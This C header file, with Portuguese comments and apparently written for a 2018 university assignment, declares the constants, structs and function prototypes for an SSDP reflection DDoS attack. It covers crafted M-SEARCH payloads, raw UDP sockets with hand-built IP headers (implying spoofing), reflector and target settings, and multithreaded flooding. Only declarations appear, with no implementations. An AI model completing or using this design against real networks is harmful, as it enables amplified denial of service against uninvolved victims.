/**
 *  ssdpLib.h
 *  Arquivo responsável por possuir constantes e metodos que realizam
 *  o ataque do protocolo SSDP.
 * 
 *  Autoria: Eduardo Schuabb Duarte
 *  Matricula: 110010876
 *  27/09/2018
*/

// Declaracao de bibliotecas utilizadas.

#include <stdio.h>				// Biblioteca para printf.
#include <string.h>				// Biblioteca para manipulacao da memoria.
#include <sys/socket.h>			// Biblioteca para criacao do socket.
#include <stdlib.h>
#include <arpa/inet.h>			// Biblioteca para uso da funcao inet_addr()
#include <netinet/in.h>			// Biblioteca para uso da struct sockaddr_in
#include <unistd.h> 			// Biblioteca para close descritor.
#include <time.h>
#include <pthread.h>            // Biblioteca para threads.
#include <sched.h>
#include <netinet/ip.h>			// Biblioteca para manipulacao cabecalho ip.
#include <netinet/udp.h>		// Biblioteca para manipulacao cabecalho udp.
#include <math.h>

#include "list.h"


// Declaracao de constantes.
#define PCKT_LEN 4096

static const char SSDP_MULTICAST_M_SEARCH_MESSAGE[] = "M-SEARCH * HTTP/1.1\r\n"\
                                                    "HOST: 239.255.255.250:1900\r\n"\
                                                    "MAN: \"ssdp:discover\"\r\n"\
                                                    "MX: 3\r\n"\
                                                    "ST: ssdp:all\r\n"\
                                                    "USER-AGENT: RTLINUX/5.0 UDAP/2.0 printer/4\r\n\r\n";

static const char SSDP_MULTICAST_M_SEARCH_MESSAGE_part_1[] = "M-SEARCH * HTTP/1.1\r\n"\
                                                    "HOST: ";

static const char SSDP_MULTICAST_M_SEARCH_MESSAGE_part_2[] = "\r\nMAN: \"ssdp:discover\"\r\n"\
                                                    "MX: 3\r\n"\
                                                    "ST: ssdp:all\r\n"\
                                                    "USER-AGENT: RTLINUX/5.0 UDAP/2.0 printer/4\r\n\r\n";                                                    



static const char SSDP_ATTACK_M_SEARCH_MESSAGE_part_1[] = "M-SEARCH * HTTP/1.1\r\n"\
                                                        "HOST: "; 


static const char SSDP_ATTACK_M_SEARCH_MESSAGE_part_2[] = "\r\nMAN: \"ssdp:discover\"\r\n"\
                                                    "ST: upnp:rootdevice\r\n"\
                                                    "USER-AGENT: RTLINUX/5.0 UDAP/2.0 printer/4-TESTE\r\n\r\n";


static const char SSDP_IP_MULTICAST[] = "239.255.255.250";
static const int SSDP_PORT = 1900;


// Declaracao de struct
// ----------------------------------------------------------------

typedef struct pacoteAtaque {
    char* datagrama;
    int datagramaSize;
    struct ip* iph;
    struct sockaddr_in sin;
} pacoteAtaque;    

typedef struct configuracaoAtaque {
    dispositivoSSDP* dispositivoRefletor;
    dispositivoSSDP* dispositivoAlvo;
    int intensidadeDoAttack;
    int tempoAtaque;
} configuracaoAtaque;

typedef struct pacoteThread {
    pacoteAtaque* pckAttack;
    configuracaoAtaque* config;
    int sck;
    int quantPacotesEnviados;
    int quantThreads;
} pacoteThread;

// ----------------------------------------------------------------



void pesquisarDispositivosSSDP(listDispositivoSSDP* dispositivosSSDP);
configuracaoAtaque* configurarAttackSSDP(listDispositivoSSDP* listaDispositivos);
pacoteAtaque* montaPacketAttackSSDP(configuracaoAtaque* configuracao);
int iniciaAtaqueSSDP(configuracaoAtaque* configuracao, pacoteAtaque* pktAtaque, int quantThreads);

// Funcoes de utilizacao em threads.
//------------------------------------------------------------------------------------------------------------------------------------------------------
void* multicast_escuta_meio_SSDP(void* arg);
void* multicast_m_search_SSDP(void* arg);
void* realizaAtaque(void* arg);

// Funcoes de criacao do pacote udp para ataque
//------------------------------------------------------------------------------------------------------------------------------------------------------
int criandoRawSocketUDP();
unsigned short csum(unsigned short *buf, int nwords);
void printBytesMemory(char *bytes_array, int quantTotalBytes);
int contaBytesMensagem(char *vetorChar);

//------------------------------------------------------------------------------------------------------------------------------------------------------
// Funcoes para criacao das estruturas ao final de cada fase.
pacoteAtaque* criaPacoteAtaque(char* datagrama, int datagramaSize, struct ip* iph, struct sockaddr_in sin);
configuracaoAtaque* criaConfigAtaque(dispositivoSSDP* dispositivoRefletor, dispositivoSSDP* dispositivoAlvo, int intensidadeDoAttack, int tempoAtaque);
pacoteThread* criaPacoteThread(pacoteAtaque* pckAttack, configuracaoAtaque* config, int sck, int quantThreads);